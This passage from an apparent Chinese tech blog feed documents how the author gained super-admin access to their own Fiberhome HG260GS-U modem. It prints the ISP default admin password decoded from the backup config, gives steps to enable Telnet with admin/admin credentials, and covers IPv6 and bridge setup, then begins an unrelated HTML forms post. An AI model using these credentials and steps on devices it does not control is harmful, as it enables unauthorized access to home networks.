<a href="http://192.168.1.1/backupsettings.conf" target="_blank" rel="noopener">http://192.168.1.1/backupsettings.conf</a> ，下载配置文件<code>backupsettings.conf</code>。</p><p>注意一定要在登陆后才下载，否则下载得到的文件并没有配置信息，而是一个让你登录界面的 HTML 文件。</p><p><img src="/2020/02/27/Server_OpticalModem/backupsettings_error.png" alt="错误示范"></p><p>正确的文件是一个xml文本，例如下面这样的。</p><p><img src="/2020/02/27/Server_OpticalModem/backupsettings.png" alt="正确示范"></p><p>可以发现里面保存了所有的配置信息，WAN连接、LAN连接、WiFi及WPS、宽带信息、Loid等等都有，当然，超级用户信息也在。</p><p>而且这个文件没有（明显的）加密，最多只是用了个<code>base64</code>。</p><p><img src="/2020/02/27/Server_OpticalModem/superadmin.png" alt="超级用户"></p><p>超级管理员用户就在<code>DeviceInfo</code>下的<code>X_CMCC_TeleComAccount</code>里。</p><p><strong>用户名为<code>admin</code></strong>，<strong>密码</strong>通过<code>base64</code>解码可以得到为<code>Cmcc10086#</code>。</p><p>（By the way，user用户的密码在这里啦↓</p><p><img src="/2020/02/27/Server_OpticalModem/userinfo.png" alt="user信息"></p><h3 id="Step3-登录试试"><a href="#Step3-登录试试" class="headerlink" title="Step3 登录试试"></a>Step3 登录试试</h3><p>成功登录，界面比user功能多得多了，可以配置宽带信息、VLAN、USB存储远程下载等等了。</p><p><img src="/2020/02/27/Server_OpticalModem/login_main.png" alt="登陆后的界面"></p><br><hr><h2 id="0x02-开启-Telnet-管理"><a href="#0x02-开启-Telnet-管理" class="headerlink" title="0x02 开启 Telnet 管理"></a>0x02 开启 Telnet 管理</h2><p>按理说是可以利用工程账号进去开启 Telnet 的，然而我也不知道为啥进不去emmm</p><p>找个网上的图↓</p><p><img src="/2020/02/27/Server_OpticalModem/telnet_enable_web.png" alt="开启telnet"></p><p>那就*<em>直接改配置文件好吧 *</em>233333</p><h3 id="Step-1-修改配置文件"><a href="#Step-1-修改配置文件" class="headerlink" title="Step 1 修改配置文件"></a>Step 1 修改配置文件</h3><p>首先<strong>备份一份上面下载的配置文件</strong>（改错了还可以恢复嘛），而后搜索<code>telnet</code>，<strong>把它设为<code>TRUE</code>。</strong></p><p><strong>注意大小写呀！</strong></p><p>当然如果想要开启 FTP 的话可以顺便开启一下hhh。</p><p><img src="/2020/02/27/Server_OpticalModem/telnet_enable.png" alt="开启telnet"></p><h3 id="Step-2-上传配置文件"><a href="#Step-2-上传配置文件" class="headerlink" title="Step 2 上传配置文件"></a>Step 2 上传配置文件</h3><p>访问<strong>更新路由器配置</strong>的页面 <a href="http://192.168.1.1/updatesettings.html" target="_blank" rel="noopener">http://192.168.1.1/updatesettings.html</a></p><p>（可能需要登录）</p><p><img src="/2020/02/27/Server_OpticalModem/updatesettings.png" alt="updatesettings"></p><p>选择修改后的配置文件，点击 <strong>更新配置</strong>。</p><h3 id="Step-3-重启光猫"><a href="#Step-3-重启光猫" class="headerlink" title="Step 3 重启光猫"></a>Step 3 重启光猫</h3><p>（如果没有自动重启的话</p><p>可以选择在 <strong>管理-设备管理-设备重启</strong> 里重启，当然也可以直接关掉电源再打开233。怎么喜欢怎么来。</p><p><img src="/2020/02/27/Server_OpticalModem/reboot.png" alt="reboot"></p><h3 id="Step4-telnet-连接光猫"><a href="#Step4-telnet-连接光猫" class="headerlink" title="Step4 telnet 连接光猫"></a>Step4 telnet 连接光猫</h3><p>而后就可以通过 telnet 连接到你的光猫了。</p><p><strong>用户名和密码都是<code>admin</code>。</strong></p><p><img src="/2020/02/27/Server_OpticalModem/telnet.png" alt="telnet"></p><p>它用的是 <strong>BCM96838</strong> 这个芯片。<em>（感兴趣可以搜一搜</em></p><p>发现它并没有 cd 这个command。</p><pre><code> &gt; help?helplogoutexitquitrebootbrctlcatvirtualserverddnsdfloglevellogdestdumpcfgdumpmdmdumpeidmdmmeminfopspkilldumpsysinfodnsproxysyslogechoifconfigpingpspwdsntpsysinfotftpwlctlshowOmciStatslaseromciomcipmdumpOmciVoicedumpOmciEnetdumpOmciGemlaserarpdefaultgatewaydhcpserverdnslanlanhostspasswdppprestoredefaultroutesaveswversionuptimecfgupdateswupdateexitOnIdlewansetgetgendefsettingsloaddefsettingscheckdefsettingscomposenewsettingscreate_merge_presettingtransform_presettingupgradeledctlusbtestlsfacmodesimcardvoipteststartvoiptestendvoice_testphone_connectrecordpcmstartrecordpcmendStartCallStopCallStartRingStopRingPlayCNGToneStopCNGTonePlayDTMFTonefhvoiceredirectmcpctlitmswificard</code></pre><p>不过好像功能也不少的亚子。</p><p>看了一下存储。</p><p><img src="/2020/02/27/Server_OpticalModem/df.png" alt="df"></p><p>内存。</p><p><img src="/2020/02/27/Server_OpticalModem/meminfo.png" alt="meminfo"></p><p>然后发现有一个<strong>隐藏的<code>sh</code>指令</strong>，可以支持大部分的 Linux 指令啦~</p><p>看了一下系统信息。</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># uname -a</span>Linux <span class="token punctuation">(</span>none<span class="token punctuation">)</span> 3.4.11-rt19 <span class="token comment" spellcheck="true">#3 SMP PREEMPT Mon Jul 4 19:17:02 CST 2016 mips GNU/Linux</span></code></pre><p>webs 目录下为所有的前端网页的文件。</p><p><img src="/2020/02/27/Server_OpticalModem/sh.png" alt="sh"></p><pre><code>FHFactoryCheck.html                  ipsec.htmlFH_Simple_CloseHideWeb.html          ipsecview.htmlFH_Simple_FactoryRestore.html        ipv6lancfg.htmlFH_Simple_OpenHideWeb.html           itms_right.htmlStaticIpAdd.html                     itms_wrong.htmlStaticIpErr.html                     itmsuploadfinish.htmlareacode.js                          itmsuploadfinish_guangdong.htmlbackupsettings.html                  itmsuploadingimage.htmlbuildinfo.html                       itmsuploadingimage_guangdong.htmlcertadd.html                         itmsuploadreboot.htmlcertcaimport.html                    jquery.jscertcaview.html                      lanvlancfg.htmlcertimport.html                      lockerror.htmlcertloadsigned.html                  logconfig.htmlcertlocalview.html                   login.htmlcertreqshow.html                     loginerror.htmlcertshow.html                        logintro.htmlcfgepon.html                         logo.htmlcfgeth.html                          logoffaccount.htmlcfggpon.html                         logout.htmlcodepassword.html                    logview.htmlcolors.css                           macstudy.htmlctExternalApInfo_user.html           main.htmlctExternalApInfooffline.html         mainCT.htmlctStaticIpAdd.html                   menuCT.jsctTracerouteresult.html              menuTitle.jsctalgcfg.html                        menuTree.jsctdhcpcfg.html                       multicast.htmlctdhcpdevice.html                    password.htmlctdiag.html                          picctdiag_ping.html                     platconfig.htmlctdiag_tracert.html                  portName.jsctdiagmng.html                       portalmngr.htmlctdiagsystem.html                    portmap.htmlctdiagxPon.html                      portmapadd.htmlctdms.html                           portmapedit.htmlctdnsconfig.html                     pradd.htmlcteponinterfaceinfo.html             prmngr.htmlctexternalApInfo.html                pswdadmin.htmlctgponinterfaceinfo.html             pswduser.htmlctigmpproxy.html                     qoscls.htmlctigmpsnooping.html                  qosclsedit.htmlctinfo.html                          qosclsview.htmlctinfo_fujian.html                   qosqmgmt.htmlctipflt.html                         qosqueue.htmlctipfltblack.html                    qosqueueadd.htmlctipfltwhite.html                    qosview.htmlctlanbind.html                       rebootinfo.htmlctlogconfig.html                     redirect.htmlctlogflashview.html                  redirect_cardoffline.htmlctlogintro.html                      redirect_portal.htmlctlogview.html                       redirect_portal_confirm.htmlctloid.html                          redirect_uploadimage.htmlctmacflt.html                        register.htmlctmacpolicy.html                     register_anhui.htmlctmldproxy.html                      register_fail.htmlctmldsnooping.html                   register_fujian.htmlctmulticastvlan.html                 register_guangdong.htmlctpingresult.html                    register_guangdong_fail.htmlctpswdrelogin.html                   register_hainan.htmlctroute6add.html                     register_ing.htmlctstatslan.html                      register_ing_anhui.htmlctstatslan_user.html                 register_ing_card.htmlctusererror.html                     register_ing_fujian.htmlctuserpswd.html                      register_ing_guangdong.htmlctwan_ethinfo.html                   register_ing_guangdong_1.htmlctwanconfig.html                     register_ing_guangdong_refresh.htmlctwanconfig_user.html                register_ing_hainan.htmlctwaninfo.html                       register_ing_iframe.htmlctwaninfo6.html                      register_ing_iframe_refresh.htmlctwaninfo6_user.html                 register_ing_iframe_refresh_1.htmlctwaninfo_user.html                  register_ing_sichuan.htmlctwaninfoall.html                    register_limit.htmlctwaninfoallv6.html                  register_loid.htmlctwlanInfo.html                      register_restore.htmlctwlanInfo_user.html                 register_restore_remote.htmlctwlcfg.html                         register_restore_retry.htmlctwlsecurity.html                    register_restore_retry_sichuan.htmlddnsadd.html                         register_restore_sichuan.htmldefaultsettings.html                 register_restoreinfo.htmldhcpinfo.html                        register_sichuan.htmldiaginform.html                      registered_chongqing.htmldnscfg.html                          registered_fujian.htmldnsproxycfg.html                     registered_guangdong.htmldosprotect.html                      registered_hunan.htmldownloadFile.html                    resetrouter.htmlenableipv6.html                      restoreinfo.htmlengdebug.html                        restoresettings.htmleponadderr.html                      restrain.htmlepondelerr.html                      ripcfg.htmlethadderr.html                       routeadd.htmlethdelerr.html                       routetbl.htmlexporting.js                         rtdefaultcfg.htmlexternalapcfg.html                   rtdefaultcfgerr.htmlexternalapcfgoffline.html            rtroutecfg.htmlexternalapsecurity.html              scdmz.htmlexternalapsecurityoffline.html       scinflt.htmlfactorymode.html                     scinfltview.htmlfbctwanconfig.html                   scmacflt.htmlfhvoiceh248dsp.html                  scmacfltview.htmlfhvoiceh248mgc.html                  scmacpolicy.htmlfhvoiceh248ngn.html                  scoutflt.htmlfhvoiceh248port.html                 scoutfltview.htmlfhvoiceprotocol.html                 scvrtsrv.htmlfhvoicesettings.html                 servmngr.htmlfhvoicesipadvance.html               simcardoffline.htmlfhvoicesipbasic.html                 sipregstatus.htmlfhvoicesipdigitmap.html              sipteleview.htmlfhvoicesipfax.html                   sntpcfg.htmlfhvoicesipuserline.html              speed.htmlfirewall.html                        statsifc.htmlfooter.html                          statsifcreset.htmlftpcfg.html                          statswan.htmlgponadderr.html                      statswanreset.htmlgpondelerr.html                      storageusraccadd.htmlhelp_manage_device.html              stylemain.csshelp_manage_file.html                stylesCT.csshelp_manage_keep.html                surprise.htmlhelp_manage_user.html                todadd.htmlhelp_net_QOS.html                    todmngrview.htmlhelp_net_WLAN.html                   tr69cfg.htmlhelp_net_dhcp.html                   tr69cfgview.htmlhelp_net_externalap.html             tr69connect.htmlhelp_net_network.html                traffictl.htmlhelp_net_remote.html                 traffictladd.htmlhelp_net_route.html                  updatesettings.htmlhelp_net_time.html                   upload.htmlhelp_net_voice.html                  upload_chongqing.htmlhelp_net_voip.html                   uploadinfo.htmlhelp_safe_firewall.html              upnpcfg.htmlhelp_safe_mac.html                   url_add.htmlhelp_safe_port.html                  urlfilter.htmlhelp_safe_wan.html                   urlfilterErr.htmlhelp_status_device.html              usbbackup.htmlhelp_status_net.html                 usbbackuphandle.htmlhelp_status_remote.html              usbbackupresult.htmlhelp_status_user.html                usbinfo.htmlhelp_status_voip.html                usbxdown.htmlhelp_use_IGMP.html                   util.jshelp_use_MLD.html                    wlcfg.htmlhelp_use_UPNP.html                   wlcfg_jiangsu.htmlhelp_use_VOIP.html                   wlcfg_zhejiang.htmlhelp_use_device.html                 wlcfg_zhejiang_user.htmlhelp_use_dns.html                    wlcfgadv.htmlhelp_use_nat.html                    wlrefresh.htmlhelp_use_usual.html                  wlsecurity.htmlhighcharts.js                        wlsecurity_jiangsu.htmlhlpethconn.html                      wlsecurity_zhejiang.htmlhlpwlconn.html                       wlsecurity_zhejiang_user.htmlindex.html                           wlshared.htmlipsconfig.html                       wlwapias.html</code></pre><p>然后还可以发现之前的配置文件在 <code>/fhconf/backpresettings.conf</code>。</p><p>日志文件在<code>/fhlog/messages</code> 。</p><p><code>/rom/etc/wlan</code> 目录下好像有一些网卡芯片的驱动（？</p><p><img src="/2020/02/27/Server_OpticalModem/rombin.png" alt="rom"></p><p>然后在某个目录下找到了各种默认配置文件emmm</p><p><img src="/2020/02/27/Server_OpticalModem/default_settings.png" alt="default_settings"></p><p>其他的后面再慢慢玩吧（</p><p>还有提醒一下，<strong>telnet 不用的话最好还是关掉</strong>吧，防止别人连上光猫改了你的配置就不好了呢。</p><br><hr><h2 id="0x03-再看光猫参数-amp-测速"><a href="#0x03-再看光猫参数-amp-测速" class="headerlink" title="0x03 再看光猫参数 &amp; 测速"></a>0x03 再看光猫参数 &amp; 测速</h2><h3 id="光猫参数"><a href="#光猫参数" class="headerlink" title="光猫参数"></a>光猫参数</h3><p>上网搜了一下这个光猫的参数。（可能有所区别）</p><blockquote><p>烽火HG260GS-U</p><p>产品特点   </p><ul><li>支持GPON接口，4FE+2POTS，LAN1口=1G LAN 2.3.4口=100M  </li><li>支持路由/桥混合转发。  </li><li>支持VLAN连接。   </li><li>提供2.4GHz 802.11b/g/n无线接入功能，最高速率可达270Mbps，覆盖范围30m~100m。   </li><li>支持SIP/MGCP/H.248等VOIP协议语音，支持多种语音编码器。   </li><li>强大的QoS能力，保障多业务环境下的VoIP、IPTV等关键业务的服务质量。   </li><li>支持TR-069远程管理：设备配置、版本升级、诊断等。   </li><li>支持WPS。   </li><li>支持Web方式，用户本地管理功能。   </li><li>支持多SSID，提供多个虚拟无线网络。   </li><li>支持VPN穿越 ，基于IPSec/L2TP。   </li><li>支持IPv4/v6,TCP/UDP协议，支持IPv6开启DS-lite和双栈功能。   </li><li>芯片集成度高，功耗小，性能稳定。   </li></ul></blockquote><p>哇呜，它是<strong>支持千兆</strong>的啊！</p><p>不过<strong>只有1口支持1Gbps，其他都是100Mbps的</strong>emmm </p><p>于是直接用网线连接光猫测了一下，果然是这样。</p><p>之前都没注意这个问题唉！是不是因为这个问题影响了网速啊啊啊啊嘤嘤嘤。<em>（其实我也不知道我家宽带有多少带宽）</em></p><p>来测个速看看好了。</p><h3 id="测速"><a href="#测速" class="headerlink" title="测速"></a>测速</h3><p>这是 <strong>连接 WiFi</strong> 的测速结果↓。</p><p><img src="/2020/02/27/Server_OpticalModem/speedtest1.png" alt="WiFi测速"></p><p>通过<strong>网线直连到除1口外的任意一个 LAN 口</strong>，再次测速。</p><p><img src="/2020/02/27/Server_OpticalModem/speedtest2.png" alt="LAN2-4测速"></p><p>差不多跑满100Mbps的带宽了。</p><p>那再来看看 <strong>LAN1 的千兆口</strong>吧。</p><p><img src="/2020/02/27/Server_OpticalModem/speedtest3.png" alt="LAN1测速"></p><p>？？？</p><p>你在逗我嘛？！哇呜原来有差不多150Mbps的啊！</p><p>原来<strong>受限于 LAN 口的带宽</strong>啊！</p><p>气死我了，连接WiFi的话只有差不多1/3的速度啊，草（一种植物）。</p><p>然后把之前连在光猫后的无线路由器接到了 LAN1 口，再登上路由器一看，原来它也只支持百兆带宽emmm</p><p><img src="/2020/02/27/Server_OpticalModem/router.png" alt="router"></p><p>不过怎么说好呢，毕竟这光猫和路由器都有些年纪了，那时候千兆还没普及呢，可能用的才是10M/50M最多也不超过100M的宽带呢。</p><p>所以光猫有一个千兆口也很不错了呢233333.（摊手.gif</p><h3 id="网线的讲究"><a href="#网线的讲究" class="headerlink" title="网线的讲究"></a>网线的讲究</h3><p>噢对了，还有一个好玩的事。。。</p><p>要用上千兆以太网，不仅需要<strong>光猫、路由器支持</strong>，还要你自己的<strong>设备支持</strong>，如果有线连接的话网线还至少要<strong>超五类线</strong>。</p><p>但是还要注意<strong>距离限制</strong>，超过一定的距离（如100m）也不行了，类别越高传输的频率越高则允许的距离就越小。（啊大佬你用光纤？打扰了。</p><p>我用网线连接的时候，最开始用的是一根比较老的 CAT-5e（超五类）线，可能是端口接触不大好或者线路老化的原因吧，实际网卡只协商到了100Mbps。换了一根新的网线（好像也是CAT-5e）就有1Gbps了。</p><p>然而，这根网线不够长，我用连接器把两根都能通千兆的网线连一起再连到电脑，这时网口又协商到100Mbps了emmm</p><p>看来这个网线抗干扰能力不大行呀，千兆网的有线传输要求还是挺严格的。</p><p>不过现在用的基本就<strong>六类线以上</strong>了吧，买网线还有装修布线什么的时候要注意一下这个问题。</p><p>还有买网线<strong>不要买扁的那种</strong>，剖面圆形那种就好。（感觉算是<strong>传输线理论</strong>？</p><br><hr><h2 id="0x04-启用-IPv6"><a href="#0x04-启用-IPv6" class="headerlink" title="0x04 启用 IPv6"></a>0x04 启用 IPv6</h2><p>前面看光猫的参数，发现支持 IPv6 唉！</p><p>听说三大运营商的宽带基本部署 IPv6 了，不过估计设置里没开启，本地也没有分配公网地址，这次就来折腾一下吧。</p><blockquote><p>先说一下，我自己对IPv6这一块都不大了解，这也是第一次尝试设置这个。</p><p>包括前缀分配什么的我都不清楚，所以这里的说法有可能存在错误，<strong>大佬们看到的话欢迎和我交流呀！</strong></p></blockquote><h3 id="Step-1-以超级管理员身份登录光猫"><a href="#Step-1-以超级管理员身份登录光猫" class="headerlink" title="Step 1 以超级管理员身份登录光猫"></a>Step 1 以超级管理员身份登录光猫</h3><p>用上面获取的用户名密码登录。</p><p>在设置前，查看<strong>状态-网络侧信息-IPv6 连接信息</strong>，应该是空的。而 <strong>IPv4 连接信息</strong>里有一个连接的描述里是带有<code>INTERNET</code>的。</p><p>（假装这里有截图）</p><h3 id="Step-2-获取当前设置的参数"><a href="#Step-2-获取当前设置的参数" class="headerlink" title="Step 2 获取当前设置的参数"></a>Step 2 获取当前设置的参数</h3><p>首先在<strong>连接名称</strong>里选择带有<code>INTERNET</code>的选项，然后<strong>把这一页截个图或者拍照备份一下</strong>。（重要）</p><p>最好也备份一下设置文件（同 0x01）！</p><p>这里面的VLAN ID、MTU是后面的依据。</p><h3 id="Step-3-新建宽带连接"><a href="#Step-3-新建宽带连接" class="headerlink" title="Step 3 新建宽带连接"></a>Step 3 新建宽带连接</h3><p>这里前提是<strong>知道宽带的密码</strong>，如果不知道的话，可以在 <strong>0x01</strong> 中获取到的备份文件里找到嘿嘿嘿（仅做了base64加密）。</p><p>新建一个WAN连接，<strong>模式选择<code>Route</code>（路由），协议模式选择<code>IPv4 &amp; IPv6</code>（这就是目的所在喵！）。</strong></p><p>选<code>PPPoE</code>，MTU里填上一步骤的参数；勾选<strong>启用Vlan</strong>，<strong>Vlan ID填上一步参数</strong>。</p><p><strong>IPv6地址分配机制</strong>的话，我这里<strong>自动获取</strong>和<strong>DHCPv6</strong>都行，不过建议选自动获取吧。。。<em>（不大清楚</em></p><p>获取前缀勾上吧，好像可以靠这个下发IPv6.<em>（？</em></p><p>服务模式选择<code>INTERNET</code>。</p><p>绑定端口就是你想要通过这个WAN进行连接网络的端口，如果不清楚的话全勾上就行了。如果有IPTV的话注意不要勾对应的端口。当然有其他需求的自己再考虑。它这里注明了的。</p><blockquote><p>注: WAN连接之间不能共享绑定端口，最后绑定端口的WAN连接绑定操作将冲掉之前其它WAN连接对该端口的绑定操作！</p></blockquote><p>大概的界面类似于这样的。不同设备大同小异的啦。</p><p><img src="/2020/02/27/Server_OpticalModem/IPv6_Config.png" alt="IPv6_Config"></p><p>而后点击<strong>保存/应用</strong>。</p><h3 id="Step-4-IPv6-DHCP-配置"><a href="#Step-4-IPv6-DHCP-配置" class="headerlink" title="Step 4 IPv6 DHCP 配置"></a>Step 4 IPv6 DHCP 配置</h3><p><em>（这一块其实我也不大清楚emmm</em></p><p>大概是这样吧</p><p><img src="/2020/02/27/Server_OpticalModem/IPv6_DHCPConfig.png" alt="IPv6_DHCPConfig"></p><p>貌似DHCPv6是私网，Radvd是利用获取的前缀下发公网的地址。</p><p>网上大概这么说的↓。</p><blockquote><p>在IPV6的自动配置中，分为两种技术<br>一种是传统的有状态(stateful),典型代表就是与IPv4时代相对应的DHCPv6，<br>一种是IPv6的无状态(stateless)自动配置，典型代表是Radvd。这是IPv6协议的一个突出特点:支持网络节点的地址自动配置。    </p><p>在无状态地址自动配置方式下，网络接口接收路由器宣告的全局地址前缀，再结合接口ID得到一个可聚集全局单播地址。在有状态地址自动配置的方式下，主要采用动态主机配置协议（DHCP），需要配备专门的DHCP服务器，网络接口通过客户机/服务器模式从DHCP服务器处得到地址配置信息。  </p><p>具体来说，以RADVD为代表的无状态自动配置不需要消耗很多机器资源，也不像传统DHCP一样需要维护一个本地数据库来维护地址分配状态，他只是进行广播前缀地址，客户端收到这种广播后再自己使用EUI64算法生成全球唯一的IPv6地址，进行自我配置。   </p></blockquote><p>还有</p><blockquote><p>&lt;1&gt;radvd用于无状态自动配置地址，客户端通过网络接口接收路由器宣告的全局地址前缀，再结合接口ID形成全球单播地址，但是这种配置不能获取DNS。</p><p>&lt;2&gt;dhcpv6用于有状态自动配置地址，类似于ipv4的dhcp，客户端从服务器的地址池中配置地址，可获取到DNS。</p></blockquote><p>（然后应该还要配置一下 <strong>IPv6 DNS Proxy</strong>，<em>这个我也不大清楚emmm</em></p><h3 id="Step-5-确认连接状态"><a href="#Step-5-确认连接状态" class="headerlink" title="Step 5 确认连接状态"></a>Step 5 确认连接状态</h3><p>返回到<strong>状态-网络侧信息</strong>，分别看看IPv4和v6的连接信息。留意协议中带有IPv4&amp;IPv6的状态。</p><p>刚开始可能连不上，过一段时间就连上了。</p><p>如果还连不上的话，将之前带有 <code>INTERNET</code> 的那个WAN连接给禁用或删除就好了。</p><p>（不过如果有个TR069那个运营商配置下发的就自己看着办了，删了可以不受运营商进行配置下发和上报，有影响的话新建一个或者修改上一步的服务模式就好了。</p><p>到这里我惊喜地发现，貌似<strong>账号支持多播</strong>唉！不过这个光猫里自然不支持<strong>多播叠加</strong>的了。可以使用桥接宽带让后面的路由器做处理啦。（后面再说）</p><p>于是尝试了一下成功连了两个，其中绑定端口设置成不一样的。不过不知道最多可以几播hhh。</p><p><img src="/2020/02/27/Server_OpticalModem/IPv4_ConnectInfo.png" alt="IPv4_ConnectInfo"></p><p><img src="/2020/02/27/Server_OpticalModem/IPv6_ConnectInfo.png" alt="IPv6_ConnectInfo"></p><p>连接光猫是可以下发 IPv6 公网地址的。</p><p><img src="/2020/02/27/Server_OpticalModem/IPv6_ConnectInfo2.png" alt="IPv6_ConnectInfo2"></p><p>然后发现那个外接的无线路由器也不支持 IPv6，气死了<em>（后面换一个</em></p><p>不过也有<strong>解决方案</strong>的，就是把网线连接到无线路由器的<strong>LAN口</strong>而不是WAN口，关闭它的 DHCP 功能，由光猫直接分配 IP 地址就行了。</p><p><br><br></p><p>然而有个大问题，就是我的 IPv6 没有Internet访问权限。手动配置了DNS也不行。</p><p><code>ping -6 ipv6.baidu.com</code>通不了。</p><p><code>tracert 240c::6666</code> 发现到我的光猫就出不去了。</p><p>试了一下在光猫上的诊断里用IPv6进行ping也没有连接。</p><p>不知道哪里设置有问题了，很懵（摊手。</p><p><strong>求大佬们指点一下。</strong></p><br><hr><h2 id="0x05-宽带桥接改造"><a href="#0x05-宽带桥接改造" class="headerlink" title="0x05 宽带桥接改造"></a>0x05 宽带桥接改造</h2><p>前面说支持多播嘛，然后就想到利用光猫桥接宽带，然后再利用后面的路由器（软路由/硬路由）进行拨号。</p><p>或者是这种情况，网络流量较大，路由较复杂等光猫难以承受或者不够稳定，也可以试试桥接的方案。</p><p>方法类似于 <strong>0x04</strong>。</p><p>大概就像图里这样吧。</p><p>勾选<strong>启用Vlan</strong>，<code>VLAN ID</code> 也和之前配置<code>INTERNET</code>的一样。</p><p><strong>绑定端口建议选端口1</strong>，毕竟是千兆口嘛！</p><p><img src="/2020/02/27/Server_OpticalModem/bridge.png" alt="桥接设置"></p><p>之后就可以直接通过 LAN1 连接路由器或者电脑进行拨号了。</p><p>拨号后也会分配公网的 IPv6 地址。<em>（然而我这里的 IPv6 还是没有Internet访问权限，估计是运营商的问题吧</em></p><p>（假装这里有截图）</p><p>当然，要实现桥接改造，你还可以尝试<strong>直接修改配置文件</strong>的方案<em>（超硬核）</em>，具体请参考<a href="https://guanggai.org/thread-459-1-1.html" target="_blank" rel="noopener">这里</a>。</p><br><hr><h2 id="0x06-其他玩意"><a href="#0x06-其他玩意" class="headerlink" title="0x06 其他玩意"></a>0x06 其他玩意</h2><p>有次在访问一个光猫的页面时输错了网址，正好发现了光猫用的 HTTP Server 是 micro_httpd。</p><p>发现指向的网站还能访问。这是个轻量级的服务器了，正好也适合在这种小设备上跑了。</p><p><img src="/2020/02/27/Server_OpticalModem/404NotFound.png" alt="404"></p><p><img src="/2020/02/27/Server_OpticalModem/acme.png" alt="micro_httpd"></p><p>这个光猫还支持远程下载，可以通过 USB 连接外部设备，开启 FTP 服务器进行访问。</p><p>不过感觉这个 USB 应该也是2.0的，勉强用用还可以吧，也没尝试过233.</p><br><hr><h2 id="0x07-小结"><a href="#0x07-小结" class="headerlink" title="0x07 小结"></a>0x07 小结</h2><p>折腾了好久这个有点古老的光猫 emmm嘤嘤嘤</p><p>于是乎本文介绍的内容包括：</p><p>通过配置备份文件获取超级管理员密码，开启 Telnet 管理，启用 IPv6，宽带桥接的改造等等。</p><p><em>是时候换个路由器了，只有大概1/3的网速太亏了！</em></p><p>怎么说好呢，感觉其实并没有干什么正事的亚子。。。</p><p>等我学完通信网络（计算机网络）说不定会有更深入的理解吧233333.</p><p><strong>欢迎大佬们来交流交流呢！</strong></p><p>还有，以上内容<strong>仅供学习研究，请在合理合法范围内使用，禁止商用。</strong></p><p><strong>转载记得注明出处呀！</strong></p><p>溜了溜了（</p><br><hr><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://bbs.mydigit.cn/read.php?tid=1827084" target="_blank" rel="noopener">HG260GS-U光猫拆解与登录解码</a></p><p><a href="http://dragonbest520.com/2018/03/04/%e5%8c%97%e4%ba%ac%e8%81%94%e9%80%9a%e5%85%89%e5%ae%bd%e5%b8%a6%e5%8f%8aiptv%e6%8a%98%e8%85%be%e7%ac%94%e8%ae%b0%ef%bc%88%e4%ba%8c%ef%bc%89-%e5%8c%97%e4%ba%ac%e8%81%94%e9%80%9ahg260gs-u-wo-37/" target="_blank" rel="noopener">北京联通光宽带及IPTV折腾笔记（二）–北京联通HG260GS-U WO-37开启超级管理员的方法</a></p><p><a href="https://www.bilibili.com/video/av45203145" target="_blank" rel="noopener">轻松开启中国移动IPV6连接，早入畅游ipv6世界</a></p><p><a href="https://guanggai.org/thread-459-1-1.html" target="_blank" rel="noopener">烽火HG220G-U 2.03+ / HG2201U 5.0+光猫改桥接教程</a></p><p>etc.</p><p><em>（大部分都好古老了</em></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> 小想法 </tag>
            
            <tag> Server </tag>
            
            <tag> Web </tag>
            
            <tag> Configuration </tag>
            
            <tag> IPv6 </tag>
            
            <tag> Modem </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FrontEnd | HTML 进阶学习笔记</title>
      <link href="/2020/02/18/FrontEnd_HTML_Advanced/"/>
      <url>/2020/02/18/FrontEnd_HTML_Advanced/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天过了一遍基础的 HTML 知识，记了点<a href="https://miaotony.xyz/2020/02/14/FrontEnd_HTML_Basic/">笔记在这里</a>。</p><p>总体感觉 HTML 果然是一门<strong>标记语言</strong>，其实它就是将要展示给用户的各种元素利用带有 <code>&lt;</code> <code>&gt;</code> 的标签标记好，浏览器再根据不同的标签渲染出不同的效果，呈现给用户。</p><p>HTML 可以说是搭了一个框架，而 CSS 则是把网页加以打扮，使其变得美观，JavaScript 则提供和拓展了网站与用户之间的交互功能。</p><p>这回就来学一学HTML中<strong>进阶</strong>的内容吧。（其实也不算进阶8</p><p>继续主要参考 W3School 的教程吧，也结合一点自己的小体会。</p><p><strong>由于博客自带了一些 CSS 样式，可能有些显示效果有所不同。</strong></p><br><h2 id="表单简介"><a href="#表单简介" class="headerlink" title="表单简介"></a>表单简介</h2><p>用于收集用户的输入。</p><h3 id="form-元素"><a href="#form-元素" class="headerlink" title="form 元素"></a>form 元素</h3><p><code>&lt;form&gt;</code> 元素用来定义 HTML 表单。</p><p>框架是这样</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- ...form elements（表单元素） ...  --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><h4 id="Action-属性"><a href="#Action-属性" class="headerlink" title="Action 属性"></a>Action 属性</h4><p><em><code>action</code> 属性</em>定义在提交表单时执行的动作。向服务器提交表单的通常做法是使用提交按钮（后面再说）。</p><p>利用 <code>action</code> 指定将信息发送到服务器的路径。</p><p>比如指定 <code>miao.php</code> 这个PHP脚本来处理提交的数据：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>miao.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><p>RESTful API 的话，通常是指定某个路径，如 <code>/api/user</code>，通过 HTTP 的不同方法进行相应的处理。</p><p>如果省略 <code>action</code> 属性，则 <code>action</code> 会被设置为当前页面。</p><h4 id="Method-属性"><a href="#Method-属性" class="headerlink" title="Method 属性"></a>Method 属性</h4><p><em><code>method</code> 属性<em>规定在提交表单时所用的 HTTP 方法（</em>GET</em> 或 <em>POST</em>）。</p><p>省略的话默认为 GET 方法。</p><pre class=" language-html"><code 